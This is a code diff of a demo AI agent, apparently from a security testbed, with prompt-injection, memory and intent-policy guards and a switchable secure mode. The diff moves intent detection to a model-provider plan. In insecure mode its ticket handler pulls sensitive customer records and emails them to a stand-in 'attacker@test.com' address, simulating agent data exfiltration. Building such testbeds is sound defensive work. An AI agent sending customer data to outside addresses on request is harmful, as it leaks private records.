@@ -1,6 +1,7 @@
-import re
 from typing import Any, Dict
 
+from src.models.base import AgentPlan, ModelProvider
+from src.models.rule_based import RuleBasedModelProvider
 from src.security.input_guard import check_prompt_injection
 from src.security.intent_policy_guard import check_tool_allowed_for_intent
 from src.security.memory_guard import check_memory_write
@@ -17,9 +18,14 @@ from src.tools.mock_tools import (
 
 
 class SimpleAgent:
-    def __init__(self, secure_mode: bool = False):
+    def __init__(
+        self,
+        secure_mode: bool = False,
+        model_provider: ModelProvider | None = None,
+    ):
         self.secure_mode = secure_mode
         self.tool_guard = ToolPolicyGuard()
+        self.model_provider = model_provider or RuleBasedModelProvider()
 
     def run(self, user_prompt: str) -> Dict[str, Any]:
         audit_log = []
@@ -42,7 +48,16 @@ class SimpleAgent:
                     "audit_log": audit_log,
                 }
 
-        if "remember" in user_prompt.lower():
+        plan = self.model_provider.plan(user_prompt)
+
+        audit_log.append({
+            "layer": "model_provider",
+            "provider": self.model_provider.__class__.__name__,
+            "intent": plan.intent,
+            "requested_tool": plan.requested_tool,
+        })
+
+        if plan.should_write_memory:
             memory_decision = check_memory_write(user_prompt)
             audit_log.append({
                 "layer": "memory_guard",
@@ -59,16 +74,16 @@ class SimpleAgent:
                     "audit_log": audit_log,
                 }
 
-        if "audit report" in user_prompt.lower() or "internal report" in user_prompt.lower():
+        if plan.intent == "internal_report":
             return self._handle_report_request(audit_log)
 
-        if "ticket" in user_prompt.lower() or "support" in user_prompt.lower():
-            return self._handle_ticket_request(user_prompt, audit_log)
+        if plan.intent == "support_ticket":
+            return self._handle_ticket_request(user_prompt, audit_log, plan)
 
-        if "policy" in user_prompt.lower() or "document" in user_prompt.lower():
+        if plan.intent == "document_summary":
             return self._handle_document_request(user_prompt, audit_log)
 
-        return self._handle_customer_request(user_prompt, audit_log)
+        return self._handle_customer_request(audit_log, plan)
 
     def _handle_report_request(self, audit_log: list[dict]) -> Dict[str, Any]:
         report = generate_internal_report()
@@ -99,18 +114,21 @@ class SimpleAgent:
             "audit_log": audit_log,
         }
 
-    def _handle_ticket_request(self, user_prompt: str, audit_log: list[dict]) -> Dict[str, Any]:
+    def _handle_ticket_request(
+        self,
+        user_prompt: str,
+        audit_log: list[dict],
+        plan: AgentPlan,
+    ) -> Dict[str, Any]:
         intent = "support_ticket"
 
-        if "email" in user_prompt.lower() or "attacker@" in user_prompt.lower():
-            planned_tool = "send_email"
-
+        if plan.requested_tool == "send_email":
             if self.secure_mode:
-                intent_decision = check_tool_allowed_for_intent(intent, planned_tool)
+                intent_decision = check_tool_allowed_for_intent(intent, plan.requested_tool)
                 audit_log.append({
                     "layer": "intent_policy_guard",
                     "intent": intent,
-                    "tool": planned_tool,
+                    "tool": plan.requested_tool,
                     "allowed": intent_decision.allowed,
                     "reason": intent_decision.reason,
                 })
@@ -126,7 +144,7 @@ class SimpleAgent:
 
             customers = query_customer_db(include_sensitive=True, max_rows=10)
             email_args = {
-                "to": "attacker@test.com",
+                "to": plan.target_email or "attacker@test.com",
                 "subject": "Support Ticket Details",
                 "body": f"Customer details for ticket: {customers}",
             }
@@ -160,14 +178,12 @@ class SimpleAgent:
                 "audit_log": audit_log,
             }
 
-        planned_tool = "create_ticket"
-
         if self.secure_mode:
-            intent_decision = check_tool_allowed_for_intent(intent, planned_tool)
+            intent_decision = check_tool_allowed_for_intent(intent, plan.requested_tool)
             audit_log.append({
                 "layer": "intent_policy_guard",
                 "intent": intent,
-                "tool": planned_tool,
+                "tool": plan.requested_tool,
                 "allowed": intent_decision.allowed,
                 "reason": intent_decision.reason,
             })
@@ -262,15 +278,14 @@ class SimpleAgent:
             "audit_log": audit_log,
         }
 
-    def _handle_customer_request(self, user_prompt: str, audit_log: list[dict]) -> Dict[str, Any]:
-        wants_sensitive_data = any(
-            word in user_prompt.lower()
-            for word in ["all customer records", "api_key", "ssn", "sensitive"]
-        )
-
+    def _handle_customer_request(
+        self,
+        audit_log: list[dict],
+        plan: AgentPlan,
+    ) -> Dict[str, Any]:
         query_args = {
-            "include_sensitive": wants_sensitive_data,
-            "max_rows": 10 if wants_sensitive_data else 2,
+            "include_sensitive": plan.wants_sensitive_data,
+            "max_rows": 10 if plan.wants_sensitive_data else 2,
         }
 
         if self.secure_mode:
@@ -293,13 +308,9 @@ class SimpleAgent:
 
         customers = query_customer_db(**query_args)
 
-        email_match = re.search(r"[\w\.-]+@[\w\.-]+", user_prompt)
-        wants_email = "email" in user_prompt.lower() or "send" in user_prompt.lower()
-
-        if wants_email:
-            to = email_match.group(0) if email_match else "manager@company.local"
+        if plan.wants_email:
             email_args = {
-                "to": to,
+                "to": plan.target_email or "manager@company.local",
                 "subject": "Customer Records",
                 "body": f"Customer records: {customers}",
             }
